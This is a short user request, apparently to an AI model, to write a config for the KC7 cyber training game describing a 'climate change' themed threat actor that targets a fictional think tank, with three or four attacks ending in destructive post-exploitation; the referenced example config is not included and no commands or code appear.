The following game config is used to generate a spy themed cyber threat actor as part of the KC7 cyber game. 
Can you generate a similar one for a "climate change" themed actor that targets a think tank named Innovation Nexus? 
More information about the thank tank in provided in the yaml config below
Use 3-4 attacks. 
The post-exploitation commands should lead to a destructive attack.
